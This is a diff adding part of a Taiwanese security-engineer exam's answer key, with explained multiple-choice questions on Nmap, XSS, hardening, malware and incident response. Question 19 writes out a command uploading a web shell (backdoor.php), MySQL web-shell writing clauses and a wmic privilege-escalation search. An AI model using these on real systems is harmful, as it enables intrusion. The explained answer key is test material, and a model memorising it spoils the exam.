@@ -1,0 +1,946 @@
+{
+  "meta": {
+    "title": "111年 資訊安全工程師 - 資訊安全防護實務 詳解",
+    "source_file": "111年資訊安全工程師-資訊安全防護實務-詳解.md",
+    "total_questions": 40
+  },
+  "questions": [
+    {
+      "id": 1,
+      "type": "single",
+      "context": "",
+      "question": "關於Nmap 工具之指令操作，下列敘述何者正確？",
+      "options": {
+        "A": "Nmap 的SYN 掃描可以掃描UDP 埠",
+        "B": "Nmap 使用-T1 參數較-T4 參數的掃描速度快",
+        "C": "Nmap 使用-sO 參數可檢測標的主機的作業系統版本",
+        "D": "Nmap 使用-D 參數為誘騙掃描（decoy scan）"
+      },
+      "answers": [
+        "D"
+      ],
+      "explanations": {
+        "A": "SYN 掃描（`-sS`）是利用 TCP 三方交握的 SYN 封包進行掃描，僅適用於 TCP 埠。UDP 掃描應使用 `-sU` 參數。",
+        "B": "Nmap 的 `-T` 參數控制掃描速度，數字越大速度越快。`-T1`（sneaky）是極慢速掃描，用於規避 IDS 偵測；`-T4`（aggressive）是高速掃描。因此 `-T1` 比 `-T4` 慢得多。",
+        "C": "`-sO` 是 IP 協定掃描（IP Protocol Scan），用於偵測目標主機支援哪些 IP 協定（如 TCP、UDP、ICMP 等），並非偵測作業系統版本。偵測作業系統版本應使用 `-O` 參數。",
+        "D": "`-D` 參數為誘騙掃描（Decoy Scan），可在掃描時偽造多個來源 IP 位址，讓目標主機難以判斷真正的掃描者，達到隱蔽的效果。用法如 `nmap -D decoy1,decoy2,ME target`。"
+      },
+      "general_explanation": "",
+      "key_points": "Nmap 常用參數：`-sS`（SYN 掃描）、`-sU`（UDP 掃描）、`-O`（OS 偵測）、`-sV`（服務版本偵測）、`-D`（誘騙掃描）、`-T0~T5`（速度控制）。 ---"
+    },
+    {
+      "id": 2,
+      "type": "single",
+      "context": "",
+      "question": "關於跨網站指令碼（Cross-Site Scripting, XSS）的防禦方式，下列何者「不」正確？",
+      "options": {
+        "A": "對輸入欄位的字串進行檢查",
+        "B": "編碼（encoding）後再輸出（output）",
+        "C": "防火牆在超文本傳輸協定（http）過濾相關XSS 攻擊",
+        "D": "使用圖型驗證碼"
+      },
+      "answers": [
+        "D"
+      ],
+      "explanations": {
+        "A": "輸入驗證（Input Validation）是 XSS 防禦的基本措施，對使用者輸入的字串進行白名單或黑名單過濾，可以阻擋惡意腳本注入。",
+        "B": "輸出編碼（Output Encoding）是最有效的 XSS 防禦方式之一，將特殊字元（如 `<`、`>`、`\"`、`'`、`&`）轉為 HTML 實體，使瀏覽器不會將其解釋為可執行的腳本。",
+        "C": "Web 應用程式防火牆（WAF）可以在 HTTP 層過濾含有 XSS 攻擊特徵的請求，作為一道外部防線。",
+        "D": "圖形驗證碼（CAPTCHA）的功能是防止自動化機器人操作（如暴力破解、自動註冊），無法防禦 XSS 攻擊。XSS 攻擊的本質是在網頁中注入惡意腳本，與是否使用驗證碼無關。"
+      },
+      "general_explanation": "",
+      "key_points": "XSS 防禦三大策略：輸入驗證、輸出編碼、內容安全政策（CSP）。圖形驗證碼屬於防機器人手段，不屬於 XSS 防禦範疇。 ---"
+    },
+    {
+      "id": 3,
+      "type": "single",
+      "context": "",
+      "question": "下列何種密碼學演算法，對於不同大小的資料，運算後產生的資料長度都一樣？",
+      "options": {
+        "A": "RC5（Rivest Cipher 5）",
+        "B": "RSA（Rivest, Shamir, Adleman）",
+        "C": "ECC（Elliptic Curve Cryptography）",
+        "D": "MD5（Message Digest Algorithm 5）"
+      },
+      "answers": [
+        "D"
+      ],
+      "explanations": {
+        "A": "RC5 是對稱式區塊加密演算法，加密後的密文長度與明文長度大致相同（視填充模式而定），不同大小的資料加密後長度不同。",
+        "B": "RSA 是非對稱式加密演算法，加密後的輸出長度取決於金鑰長度，但對於超過金鑰長度的資料需分段加密，最終輸出長度與輸入資料大小相關。",
+        "C": "ECC 是橢圓曲線密碼學，屬於非對稱式加密，輸出長度與輸入資料大小有關。",
+        "D": "MD5 是雜湊（Hash）演算法，無論輸入資料大小，經過運算後一律產生固定的 128 位元（16 位元組）摘要值。這是雜湊函數的基本特性——固定長度輸出。"
+      },
+      "general_explanation": "",
+      "key_points": "雜湊演算法（Hash）的核心特性：不論輸入資料多大，輸出長度固定。常見雜湊演算法：MD5（128 bits）、SHA-1（160 bits）、SHA-256（256 bits）。 ---"
+    },
+    {
+      "id": 4,
+      "type": "single",
+      "context": "",
+      "question": "一位資安專家正在對某公司網站進行滲透測試，在測試期間發現了一個跨網站指令碼（Cross-Site Scripting, XSS）的網站安全漏洞，若要針對此弱點進行有效攻擊，需同時符合下列何項條件？",
+      "options": {
+        "A": "網站的安全旗標（secure flag）未設定",
+        "B": "連線期間快取（session cookie）的HttpOnly 旗標未設定",
+        "C": "受害電腦沒有安裝端點防護軟體",
+        "D": "受害電腦的瀏覽器需開啟Active D 技術"
+      },
+      "answers": [
+        "B"
+      ],
+      "explanations": {
+        "A": "Secure flag 是確保 Cookie 僅透過 HTTPS 傳輸，防止在 HTTP 明文傳輸中被竊取，但與 XSS 攻擊能否成功無直接關係。即使設定了 Secure flag，XSS 仍可在 HTTPS 環境下竊取 Cookie。",
+        "B": "HttpOnly 旗標設定後，JavaScript 無法透過 `document.cookie` 讀取該 Cookie。XSS 攻擊的典型目標之一就是竊取 Session Cookie，若 HttpOnly 已設定，XSS 注入的 JavaScript 將無法存取 Cookie，大幅降低攻擊效果。因此要成功利用 XSS 竊取 Cookie，HttpOnly 旗標必須未設定。",
+        "C": "端點防護軟體並非 XSS 攻擊成功與否的必要條件。XSS 是在瀏覽器端執行的攻擊，防毒軟體通常無法攔截 XSS。",
+        "D": "ActiveX 技術與 XSS 攻擊無直接關聯。XSS 主要利用 JavaScript 執行，不需要特定的瀏覽器技術支援。"
+      },
+      "general_explanation": "",
+      "key_points": "HttpOnly 是防禦 XSS 竊取 Cookie 的重要機制；Secure flag 防止 Cookie 在非加密連線中傳輸；兩者應同時啟用以強化 Cookie 安全性。 ---"
+    },
+    {
+      "id": 5,
+      "type": "single",
+      "context": "",
+      "question": "請問下列何項惡意程式具有SSH 截持的能力？",
+      "options": {
+        "A": "Ebury",
+        "B": "Azorult",
+        "C": "MacSpy",
+        "D": "Xtunnel"
+      },
+      "answers": [
+        "A"
+      ],
+      "explanations": {
+        "A": "Ebury 是一個針對 Linux/Unix 系統的 OpenSSH 後門程式，能夠竊取 SSH 憑證並劫持（截持）SSH 連線。它會替換或修改 OpenSSH 的共用函式庫，攔截認證過程中的帳號密碼，並可將竊取的憑證回傳給攻擊者。Ebury 曾在 Operation Windigo 攻擊行動中被大規模使用。",
+        "B": "Azorult 是一個資訊竊取型惡意程式（Information Stealer），主要竊取瀏覽器儲存的密碼、加密貨幣錢包、Cookie 等，並非針對 SSH。",
+        "C": "MacSpy 是針對 macOS 的間諜軟體，功能包括鍵盤側錄、螢幕擷取、剪貼簿監控等，不具備 SSH 截持能力。",
+        "D": "Xtunnel 是 APT28（Fancy Bear）使用的網路隧道工具，用於建立加密通道穿透防火牆，並非 SSH 截持工具。"
+      },
+      "general_explanation": "",
+      "key_points": "Ebury 是最知名的 SSH 後門/截持惡意程式，針對 Linux 伺服器，會竊取 SSH 登入憑證與劫持 SSH 連線。 ---"
+    },
+    {
+      "id": 6,
+      "type": "single",
+      "context": "",
+      "question": "在Linux 系統環境下，關於Apache 安全防護設定，下列敘述何者「不」正確？",
+      "options": {
+        "A": "檢查是否有非權限用戶對Apache 設定檔擁有存取權限，建議設定成：chmod 644 /usr/local/apache/conf/httpd.conf",
+        "B": "檢查是否禁止使用PUT、DELETE 等危險的HTTP 模式，所以在httpd.conf 中，增加：`<LimitExcept GET POST>Allow from all </LimitExcept>`",
+        "C": "檢查是否禁用CGI，在httpd.conf 中，刪去有與cgi 相關的LoadModule 語句",
+        "D": "禁止非超級使用者修改Apache 伺服器根目錄，執行以下命令變更許可權：chmod -R a-w /usr/local/apache"
+      },
+      "answers": [
+        "B"
+      ],
+      "explanations": {
+        "A": "`chmod 644` 表示擁有者可讀寫（6=rw-），群組和其他人只能讀取（4=r--），這是 Apache 設定檔的合理權限設定，防止非授權使用者修改設定。",
+        "B": "`<LimitExcept GET POST>Allow from all</LimitExcept>` 的意思是「除了 GET 和 POST 以外的方法，都允許所有來源存取」，這完全與目的相反。正確做法應該是：`<LimitExcept GET POST>Deny from all</LimitExcept>`，意即「除了 GET 和 POST 以外的 HTTP 方法，全部拒絕」。",
+        "C": "若不需要 CGI 功能，應在 httpd.conf 中移除或註解掉相關的 `LoadModule` 語句（如 `mod_cgi`、`mod_cgid`），減少攻擊面。",
+        "D": "`chmod -R a-w /usr/local/apache` 移除所有使用者對 Apache 根目錄的寫入權限，防止非 root 使用者修改伺服器檔案，是安全強化的標準做法。"
+      },
+      "general_explanation": "",
+      "key_points": "`<LimitExcept>` 指令限制的是「指定方法以外」的存取，其中的權限設定應為 Deny，才能達到禁止危險 HTTP 方法的目的。 ---"
+    },
+    {
+      "id": 7,
+      "type": "single",
+      "context": "",
+      "question": "「許多惡意程式會透過郵件附件方式進行入侵破壞與竊取，造成企業重大損失，而資安工程師會透過Windows 群組原則物件（Group Policy Object, GPO）進行必要管控。」關於附圖登錄檔（Registry）範例內容，下列敘述何者正確？",
+      "options": {
+        "A": "放行WordPad 開啟附件",
+        "B": "支援Office 2003 GPO 控制",
+        "C": "對Office 2016 MS-Word 禁用巨集（Macro）",
+        "D": "對Office 2016 MS-Excel 禁用巨集（Macro）"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
+        "A": "GPO 登錄檔中針對巨集的管控是針對 Office 應用程式（Word、Excel、PowerPoint 等），WordPad 不支援巨集功能，且此設定與 WordPad 無關。",
+        "B": "Office 2003 的 GPO 登錄檔路徑與 Office 2016 不同。Office 2016 的路徑包含「16.0」版本號。題目附圖中的 Registry 路徑對應的是 Office 2016 版本。",
+        "C": "根據附圖的登錄檔設定，路徑指向 Office 2016（版本 16.0）的 Word 應用程式，並將 VBAWarnings 設定值調整為禁用巨集，這是透過 GPO 管控 Office 巨集的標準做法。",
+        "D": "附圖中登錄檔路徑對應的是 MS-Word 而非 MS-Excel。Excel 的巨集管控需要在 Excel 對應的 Registry 路徑下設定。"
+      },
+      "general_explanation": "",
+      "key_points": "透過 GPO 管控 Office 巨集的 Registry 路徑格式為 `HKCU\\Software\\Policies\\Microsoft\\Office\\16.0\\Word\\Security`，其中 VBAWarnings 值可設定巨集的啟用策略。 ---"
+    },
+    {
+      "id": 8,
+      "type": "single",
+      "context": "",
+      "question": "「身為公司資安工程師，當收到一項緊急資安情報，指出某系統核心存在嚴重的漏洞，但公司資訊資產清冊已久未更新。」下列何種做法較能即時找出組織內的所有會受到影響的伺服器？",
+      "options": {
+        "A": "手動檢視伺服器的系統記錄",
+        "B": "對所有伺服器進行作業系統指紋掃描（OS fingerprinting）",
+        "C": "截取並分析所有經過網頁代理伺服器（Web Proxy）的封包",
+        "D": "執行整體網絡上的應用程式服務探索掃描"
+      },
+      "answers": [
+        "B"
+      ],
+      "explanations": {
+        "A": "手動檢視系統記錄既耗時又不可靠，無法即時盤點所有伺服器的作業系統版本，不符合「即時」需求。",
+        "B": "作業系統指紋掃描（OS Fingerprinting）可透過工具（如 Nmap `-O`）快速識別網路上所有伺服器的作業系統類型與版本，在資產清冊未更新時，是最有效的即時盤點方式，能快速找出受漏洞影響的伺服器。",
+        "C": "截取 Web Proxy 封包僅能觀察到經過代理的網頁流量，無法全面偵測所有伺服器的作業系統版本，且不是所有伺服器都會經過 Web Proxy。",
+        "D": "應用程式服務探索掃描偵測的是運行的服務與應用程式版本，而非作業系統核心版本。題目指出的是「系統核心」漏洞，需要識別的是 OS 版本而非應用程式。"
+      },
+      "general_explanation": "",
+      "key_points": "OS Fingerprinting 分為主動式（發送探測封包）和被動式（分析流量特徵），是資產盤點與弱點管理的重要技術。 ---"
+    },
+    {
+      "id": 9,
+      "type": "single",
+      "context": "",
+      "question": "縱深防禦（Defense in Depth）的主要目的是透過多層的網路安全防禦，使駭客因為付出的成本與代價不符合效益，因而放棄入侵，下列何者「不」是縱深防禦的手段之一？",
+      "options": {
+        "A": "延遲（Delay）",
+        "B": "通報（Response）",
+        "C": "嚇阻（Deter）",
+        "D": "偵測（Detect）"
+      },
+      "answers": [
+        "B"
+      ],
+      "explanations": {
+        "A": "是縱深防禦的核心手段之一，透過多層防護措施拖延攻擊者的入侵進度，增加其攻擊成本。",
+        "B": "通報屬於資安事件應變（Incident Response）的範疇，並非縱深防禦 5D 模型中的手段。縱深防禦強調的是預防與偵測階段的多層佈署，而非事後通報。",
+        "C": "是縱深防禦的手段之一，透過可見的安全措施（如監控攝影機、警告標示、存取控制）嚇阻潛在攻擊者。",
+        "D": "是縱深防禦的手段之一，透過入侵偵測系統（IDS）、日誌監控、安全資訊與事件管理（SIEM）等機制偵測異常行為。"
+      },
+      "general_explanation": "",
+      "key_points": "縱深防禦 5D 模型：嚇阻（Deter）、偵測（Detect）、延遲（Delay）、拒止（Deny）、防衛（Defend）。通報（Response）屬於事件應變流程。 ---"
+    },
+    {
+      "id": 10,
+      "type": "single",
+      "context": "",
+      "question": "在網站平台開發時弱點管理的範疇中時常需要進行源碼檢測、弱點掃描、滲透測試；源碼檢測目的是透過對原始碼的檢查，挖掘已知或未知的網頁問題，而進行弱點掃描的目的為何？",
+      "options": {
+        "A": "驗證所知弱點的可行性",
+        "B": "以駭客或惡意使用者的角度對目標進行驗證",
+        "C": "檢測程式中的商業邏輯問題",
+        "D": "檢測在環境與系統上的錯誤"
+      },
+      "answers": [
+        "D"
+      ],
+      "explanations": {
+        "A": "「驗證所知弱點的可行性」是滲透測試的目的，透過模擬攻擊驗證弱點是否真正可被利用。",
+        "B": "「以駭客角度對目標進行驗證」同樣是滲透測試的定義與目的，而非弱點掃描。",
+        "C": "商業邏輯問題通常需要人工檢測或專門的滲透測試才能發現，自動化弱點掃描工具難以檢測商業邏輯層面的安全問題。",
+        "D": "弱點掃描（Vulnerability Scanning）的目的是透過自動化工具（如 Nessus、OpenVAS）掃描系統環境，檢測已知的安全弱點，包括作業系統漏洞、服務設定錯誤、缺少安全更新等「環境與系統上的錯誤」。"
+      },
+      "general_explanation": "",
+      "key_points": "源碼檢測→檢查程式碼層安全問題；弱點掃描→檢測環境與系統層的已知弱點；滲透測試→以攻擊者角度驗證弱點可利用性。 ---"
+    },
+    {
+      "id": 11,
+      "type": "single",
+      "context": "",
+      "question": "磁碟陣列（RAID）是指使用多個磁碟進行資料複製的檔案系統，它是一種即時備援與資料復原技術，若以硬碟毀損方面進行評估，下列何種規劃對於資料保存的安全性最低？",
+      "options": {
+        "A": "AD 主機採用2 顆SATA 硬碟規劃成RAID1",
+        "B": "網路儲存裝置（NAS）採用8 顆SATA 硬碟規劃成RAID5",
+        "C": "檔案伺服器採用4 顆SAS 硬碟規劃成RAID0",
+        "D": "儲存區域網路（SAN）採用16 顆SAS 硬碟規劃成RAID6"
+      },
+      "answers": [
+        "C"
+      ],
+      "explanations": {
+        "A": "鏡像模式，2 顆硬碟互為鏡像備份，可承受 1 顆硬碟損毀，資料安全性高。",
+        "B": "分散式奇偶校驗，8 顆硬碟中可承受 1 顆硬碟損毀而不遺失資料，具有一定的容錯能力。",
+        "C": "等量分割（Striping），完全沒有冗餘機制，所有硬碟進行資料分割存放。只要任何 1 顆硬碟損毀，所有資料就會全部遺失。4 顆硬碟的 RAID0 意味著任一顆故障都會造成全部資料損失，資料保存安全性最低。",
+        "D": "雙重分散式奇偶校驗，16 顆硬碟中可承受同時 2 顆硬碟損毀，資料安全性最高。"
+      },
+      "general_explanation": "",
+      "key_points": "RAID0 沒有任何容錯能力，追求的是效能而非安全性；RAID1 為鏡像；RAID5 容許 1 顆硬碟故障；RAID6 容許 2 顆硬碟同時故障。 ---"
+    },
+    {
+      "id": 12,
+      "type": "single",
+      "context": "",
+      "question": "下列何者對於XML 外部實體注入攻擊（XML External Entity Injection Attack, XXE）的防護效果較佳？",
+      "options": {
+        "A": "使用HTTPS 安全連線",
+        "B": "禁止文件類型定義（Document Type Define, DTD）引用外部實體",
+        "C": "使用合法憑證進行雙向（伺服器端與使用者端）之身分驗證",
+        "D": "使用SHA-3 第三代安全雜湊演算法（Secure Hash Algorithm 3）進行計算"
+      },
+      "answers": [
+        "B"
+      ],
+      "explanations": {
+        "A": "HTTPS 提供的是傳輸層加密，保護資料在傳輸中不被竊聽或竄改，但無法防止 XXE 攻擊。XXE 是在伺服器端解析 XML 時發生的注入問題，與傳輸層加密無關。",
+        "B": "XXE 攻擊的核心是利用 XML 解析器處理外部實體引用的功能。禁止 DTD 引用外部實體（Disable External Entity Processing）是最直接且最有效的防護措施。OWASP 建議在 XML 解析器中設定禁用外部實體和 DTD 處理。",
+        "C": "雙向身分驗證（Mutual TLS）確保通訊雙方的身分合法性，但無法阻止已通過驗證的合法使用者提交含有 XXE 攻擊的 XML 資料。",
+        "D": "SHA-3 雜湊演算法用於資料完整性驗證或數位簽章，與 XML 解析過程中的外部實體注入攻擊無關。"
+      },
+      "general_explanation": "",
+      "key_points": "XXE 防護首要措施是禁用 XML 解析器的外部實體處理功能，這是 OWASP Top 10 建議的標準做法。 ---"
+    },
+    {
+      "id": 13,
+      "type": "single",
+      "context": "",
+      "question": "某公司被主管機關要求須每年進行網路資安健檢，下列何者較「不」符合主管機關之資安健檢要求？",
+      "options": {
+        "A": "到場網頁應用程式弱點掃描",
+        "B": "到場網路安全備份服務",
+        "C": "遠端網路弱點掃描",
+        "D": "遠端滲透測試"
+      },
+      "answers": [
+        "B"
+      ],
+      "explanations": {
+        "A": "到場進行網頁應用程式弱點掃描是資安健檢的標準項目之一，可檢測網頁應用程式中的已知安全弱點（如 OWASP Top 10）。",
+        "B": "「網路安全備份服務」是日常維運作業，屬於資料保護與災難復原的範疇，並非資安健檢的檢測項目。資安健檢著重在弱點發現與安全性驗證，而非備份作業。",
+        "C": "遠端網路弱點掃描是資安健檢的標準項目，透過遠端方式掃描對外服務的弱點，模擬外部攻擊者的視角。",
+        "D": "遠端滲透測試是資安健檢的重要項目，透過模擬攻擊驗證系統安全性，確認弱點是否可被實際利用。"
+      },
+      "general_explanation": "",
+      "key_points": "主管機關要求的資安健檢通常包含：網路弱點掃描、網頁應用程式弱點掃描、滲透測試等檢測作業，不包含日常維運的備份服務。 ---"
+    },
+    {
+      "id": 14,
+      "type": "single",
+      "context": "",
+      "question": "某公司在網站弱點檢測報告中發現系統存在跨網站指令碼（Cross-Site Scripting, XSS）及開放式重定向（Open Redirect）問題，下列何者方案可針對上述問題進行修補？",
+      "options": {
+        "A": "XSS 可以透過過濾此符號\"<\"根治",
+        "B": "Open Redirect 可採用圖像式驗證根治",
+        "C": "採用參數化查詢（Prepared Statement）可以解決XSS",
+        "D": "HTML.Encode 是可以解決XSS 的一種方法"
+      },
+      "answers": [
+        "D"
+      ],
+      "explanations": {
+        "A": "僅過濾 `<` 符號無法根治 XSS。攻擊者可透過其他方式注入惡意腳本，例如在 HTML 屬性中使用事件處理器（`onload`、`onerror` 等）、利用 JavaScript 偽協定（`javascript:`）等手法，不一定需要 `<` 符號。",
+        "B": "圖像式驗證（CAPTCHA）用於防止自動化操作，無法解決 Open Redirect 問題。Open Redirect 的修補應採用白名單驗證重定向目標 URL，確保只能重定向到受信任的網域。",
+        "C": "參數化查詢（Prepared Statement）是防禦 SQL Injection 的方法，與 XSS 防禦無關。XSS 是在輸出端將使用者輸入渲染為 HTML/JavaScript 的問題，不涉及資料庫查詢。",
+        "D": "`HTML.Encode`（HTML 編碼）會將特殊字元轉換為 HTML 實體（如 `<` 轉為 `&lt;`、`>` 轉為 `&gt;`），使瀏覽器將其視為純文字而非可執行的 HTML/JavaScript，是防禦 XSS 的有效方法之一。"
+      },
+      "general_explanation": "",
+      "key_points": "HTML Encoding 是 XSS 防禦的重要手段；Prepared Statement 是 SQL Injection 防禦手段；Open Redirect 應使用 URL 白名單機制防護。 ---"
+    },
+    {
+      "id": 15,
+      "type": "single",
+      "context": "",
+      "question": "關於軟體組成分析（Software Composition Analysis），下列敘述何者「不」正確？",
+      "options": {
+        "A": "可透過分析來識別所使用第三方/開源軟體，其所存在的風險或威脅",
+        "B": "「軟體組成分析」為源碼檢測其一類型，主要分析軟體是否存在開發語法缺陷",
+        "C": "所分析的風險因子包括，如：元件過期、已知弱點、程式庫信任、軟體授權等",
+        "D": "「軟體透明度」能提升分析準確性，可透過如 SBOM 標準來發佈與交換資訊"
+      },
+      "answers": [
+        "B"
+      ],
+      "explanations": {
+        "A": "SCA 的主要功能就是識別專案中使用的第三方元件與開源軟體，並檢查其是否存在已知弱點、授權風險或供應鏈威脅。",
+        "B": "SCA 不是「源碼檢測」的一種類型，也不是分析「開發語法缺陷」。分析語法缺陷屬於靜態應用程式安全測試（SAST）的範疇。SCA 的重點在於分析軟體中使用的第三方元件與開源軟體的安全性、授權合規性和版本狀態，而非原始碼的語法或邏輯缺陷。",
+        "C": "SCA 分析的風險因子包括：元件是否過期、是否有已知漏洞（CVE）、程式庫來源是否可信、軟體授權是否合規（如 GPL、MIT 等授權條款）。",
+        "D": "軟體物料清單（SBOM, Software Bill of Materials）透過標準格式（如 SPDX、CycloneDX）記錄軟體中所有元件資訊，提升軟體透明度，有助於 SCA 分析的準確性。"
+      },
+      "general_explanation": "",
+      "key_points": "SCA 聚焦於第三方/開源元件的風險管理；SAST 聚焦於原始碼的安全缺陷分析。兩者互補但本質不同。 ---"
+    },
+    {
+      "id": 16,
+      "type": "multiple",
+      "context": "",
+      "question": "開放式系統互聯模型（Open System Interconnection Model, OSI）中，下列哪些「不」是在傳輸層（Transport Layer）的攻擊手法？",
+      "options": {
+        "A": "Smurf Attack",
+        "B": "DNS Poisoning",
+        "C": "SYN Flood",
+        "D": "Ping of Death"
+      },
+      "answers": [
+        "A",
+        "B"
+      ],
+      "explanations": {
+        "A": "Smurf Attack 是一種利用 ICMP Echo Request（Ping）進行的放大攻擊，攻擊者偽造受害者 IP 向廣播位址發送 ICMP 請求，造成大量回應淹沒受害者。ICMP 運作在網路層（第 3 層），因此 Smurf Attack 是網路層攻擊。",
+        "B": "DNS Poisoning（DNS 快取汙染）是透過竄改 DNS 解析結果，將域名導向惡意 IP。DNS 運作在應用層（第 7 層），因此 DNS Poisoning 不是傳輸層攻擊。",
+        "C": "SYN Flood 是利用 TCP 三方交握機制，大量發送 SYN 封包但不完成連線，耗盡伺服器資源。TCP 運作在傳輸層（第 4 層），因此 SYN Flood 是傳輸層攻擊。",
+        "D": "Ping of Death 雖然使用 ICMP（網路層），但其攻擊原理涉及 IP 分片重組的緩衝區溢位問題。然而嚴格來說 Ping of Death 利用的是 ICMP 協定，主要歸類於網路層攻擊。但在此題中，選項 A 和 B 更明確不屬於傳輸層。"
+      },
+      "general_explanation": "",
+      "key_points": "OSI 各層常見攻擊：網路層（第 3 層）→ Smurf Attack、Ping of Death；傳輸層（第 4 層）→ SYN Flood、UDP Flood；應用層（第 7 層）→ DNS Poisoning、HTTP Flood。 ---"
+    },
+    {
+      "id": 17,
+      "type": "multiple",
+      "context": "",
+      "question": "HTTP/3 標準已經開始被國內外大型網站所建置使用，而HTTP/3 安全性更是高於HTTP/1 與HTTP/2，關於HTTP/3 的技術與特性，下列敘述哪些正確？",
+      "options": {
+        "A": "HTTP/3 就是HTTP over QUIC 方式來進行資料傳送與接收，而QUIC 是Google 所提出的標準",
+        "B": "QUIC 採用UDP 通訊協定，目前許多Proxy 產品會採用強迫轉回到TCP 方式進行過濾攔阻",
+        "C": "在HTTP/3 採取更嚴格安全檢核標準，目前駭客所使用中間人攻擊（Man-In-The-Middle attack, MITM）之工具與技術很難加工處理",
+        "D": "HTTP/3 仍使用TCP 協定作為對話（Session）的傳輸層"
+      },
+      "answers": [
+        "A",
+        "B",
+        "C"
+      ],
+      "explanations": {
+        "A": "HTTP/3 的底層傳輸協定為 QUIC（Quick UDP Internet Connections），最初由 Google 於 2012 年提出並實作，後經 IETF 標準化。HTTP/3 本質上就是 HTTP over QUIC。",
+        "B": "QUIC 基於 UDP 協定運作，但許多現有的 Proxy、防火牆和網路安全設備尚未完全支援 QUIC 的深度封包檢測，因此會強制將連線降級回 TCP（即回退為 HTTP/2 或 HTTP/1.1），以便進行過濾與攔阻。",
+        "C": "HTTP/3 的 QUIC 協定內建 TLS 1.3 加密，且安全檢核更為嚴格。QUIC 的加密從連線建立初期就開始，使得 MITM 攻擊的工具和技術難以對 QUIC 流量進行解密或篡改。",
+        "D": "HTTP/3 使用 QUIC 協定，而 QUIC 是基於 UDP（而非 TCP）的傳輸協定。這正是 HTTP/3 與 HTTP/2 的根本差異——HTTP/2 基於 TCP，HTTP/3 基於 UDP（QUIC）。"
+      },
+      "general_explanation": "",
+      "key_points": "HTTP/3 = HTTP over QUIC；QUIC 由 Google 提出，基於 UDP，內建 TLS 1.3；HTTP/3 不再使用 TCP，解決了 TCP 的隊頭阻塞（Head-of-line blocking）問題。 ---"
+    },
+    {
+      "id": 18,
+      "type": "multiple",
+      "context": "",
+      "question": "關於虛擬修補（Virtual patch），下列敘述哪些正確？",
+      "options": {
+        "A": "透過分析與攔截惡意網路封包內容，而達成防護效果",
+        "B": "虛擬修補對網路攻擊防護極為有效，可取代弱點修正與更新",
+        "C": "針對已知攻擊特徵，亦可於入侵防禦系統（IPS）或網站應用程式防火牆（WAF）上設定規則阻擋",
+        "D": "常於零時弱點（Zero day）、老舊系統無法修復、人力不足無法更新程式等情境應用"
+      },
+      "answers": [
+        "A",
+        "C",
+        "D"
+      ],
+      "explanations": {
+        "A": "虛擬修補的運作原理是在網路層或應用層分析進出的封包內容，偵測並攔截含有已知攻擊特徵的惡意封包，在不修改原始系統或程式碼的情況下達成防護效果。",
+        "B": "虛擬修補是一種「臨時性」的防護措施，用於在正式修補程式尚未套用前提供過渡性保護。它無法取代實際的弱點修正與系統更新，因為虛擬修補只在網路層進行過濾，無法從根本解決系統中的漏洞。",
+        "C": "虛擬修補的具體實踐方式包括在 IPS 上設定攻擊偵測規則，或在 WAF 上設定針對特定弱點的阻擋規則，以攔截利用已知弱點的攻擊流量。",
+        "D": "虛擬修補的典型應用情境包括：零日漏洞（尚無正式修補程式）、老舊系統（已停止支援無法更新）、人力不足（無法及時部署更新程式）等，在這些情境下提供即時的臨時防護。"
+      },
+      "general_explanation": "",
+      "key_points": "虛擬修補是臨時性防護措施，透過 IPS/WAF 規則攔截攻擊流量，不修改原始系統。它是正式修補的過渡方案，不可作為永久替代方案。 ---"
+    },
+    {
+      "id": 19,
+      "type": "multiple",
+      "context": "",
+      "question": "滲透測試是一個綿密驗證過程，熟悉每個應用環節十分重要，關於個別滲透實例與技術，下列敘述哪些正確？",
+      "options": {
+        "A": "內網滲透測試，挖出網路分享（SMB）主機帳號：Administrator，密碼：Gov\\*\"#~）Tw[x，當您在CMD 模式下使用net use 指令時，其寫法為：net use \\\\\\\\10.10.10.1 \" Gov\\*\"#~）Tw[x \" /u:Administrator",
+        "B": "某PHP 網站採用Linux 主機對外開通SSH 服務，擬將一個web shell 程式放入遠端主機，其上傳檔案連線寫法可為：scp backdoor.php root@remoteserver:/www/root/",
+        "C": "MYSQL 廣泛被用在各類資訊系統，如果試圖利用MySQL 寫WebShell 有：union select、lines terminated by、lines starting by、fields terminated by、COLUMNS terminated by 等寫入方式",
+        "D": "Trusted Service Paths 漏洞是Windows 作業系統提權的一種手法，Windows 服務通常以system 權限運行，可用以下指令找出系統服務中執行檔下完整路徑包含空格且沒有被雙引號括起來的位置：wmic service get name, displayname, pathname,startmode|findstr /i \"Auto\" |findstr /i /v \"C:\\\\Windows\\\\\\\\\" |findstr/i /v \"\"\""
+      },
+      "answers": [
+        "B",
+        "C",
+        "D"
+      ],
+      "explanations": {
+        "A": "當密碼包含特殊字元時，在 CMD 中使用 `net use` 指令需要正確處理引號包裹。選項中的寫法 `\" Gov*\"#~）Tw[x \"` 引號位置不正確，密碼中的雙引號會導致指令解析錯誤。正確做法應確保密碼被完整包裹在引號中且內部的特殊字元需要適當跳脫處理。",
+        "B": "`scp`（Secure Copy Protocol）是透過 SSH 進行安全檔案傳輸的工具，`scp backdoor.php root@remoteserver:/www/root/` 是標準的 SCP 上傳語法，可將本機檔案上傳至遠端主機指定目錄。",
+        "C": "MySQL 寫入 WebShell 的技術手法確實包含多種方式：`SELECT ... INTO OUTFILE` 配合 `UNION SELECT`、`LINES TERMINATED BY`、`LINES STARTING BY`、`FIELDS TERMINATED BY`、`COLUMNS TERMINATED BY` 等子句，透過控制輸出格式將惡意 PHP 程式碼寫入 Web 目錄。",
+        "D": "Unquoted Service Path（Trusted Service Paths）是 Windows 提權的經典手法。當 Windows 服務的執行路徑包含空格且未被雙引號括起（如 `C:\\Program Files\\My App\\service.exe`），Windows 會依序嘗試 `C:\\Program.exe`、`C:\\Program Files\\My.exe` 等路徑，攻擊者可在這些位置放置惡意程式以獲得 SYSTEM 權限。所列的 WMIC 指令可有效搜尋此類漏洞。"
+      },
+      "general_explanation": "",
+      "key_points": "滲透測試需熟悉各種工具與指令的正確用法，包括 SCP 檔案傳輸、MySQL WebShell 寫入技術、Windows Unquoted Service Path 提權手法。 ---"
+    },
+    {
+      "id": 20,
+      "type": "multiple",
+      "context": "",
+      "question": "關於資安事件應變通報與情資分享，下列敘述哪些「不」正確？",
+      "options": {
+        "A": "資通安全管理法子法規定，公務機關辦理資通安全事件之通報，應於事件發生後一小時內進行通報",
+        "B": "資安事件分享屬ISAC 服務範圍之一",
+        "C": "資通安全管理法子法規定之事件嚴重等級共分四級，第一級為最嚴重，第四級為最輕微",
+        "D": "我國ISAC 機制設計，針對跨領域之資安情資分享，建議採用STIX 與TAXII 之格式與機制"
+      },
